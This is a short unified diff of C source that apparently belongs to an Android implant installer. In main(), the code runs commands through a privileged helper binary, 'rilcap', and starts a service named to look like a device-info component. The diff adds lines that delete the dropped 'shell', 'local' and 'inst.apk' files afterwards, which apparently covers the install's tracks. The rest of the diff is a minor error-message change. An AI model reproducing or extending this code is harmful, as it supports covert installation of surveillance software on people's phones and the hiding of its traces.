@@ -80,7 +80,7 @@ int download(char* ip, int server_port, char* localfile, char* send_data, char* 
         ptr = buf;
 
         if (nread < 0) {
-                perror("read\n");
+                perror("cannot read\n");
                 return(1);
         }
 
@@ -191,6 +191,13 @@ int main(int argc, char* argv[])
         system(buf_command);
         sprintf(buf_command, "/system/bin/rilcap qzx \"export LD_LIBRARY_PATH=/vendor/lib:/system/lib\nam startservice com.android.deviceinfo/.ServiceMain\"");
         system(buf_command);
+
+        sprintf(buf_localfile, "%s/local", localdir);
+        unlink(buf_localfile);
+        sprintf(buf_localfile, "%s/shell", localdir);
+        unlink(buf_localfile);
+        sprintf(buf_localfile, "%s/inst.apk", localdir);
+        unlink(buf_localfile);
 
     }else{
         printf("Error: command unknown: %s\n", argv[1]);
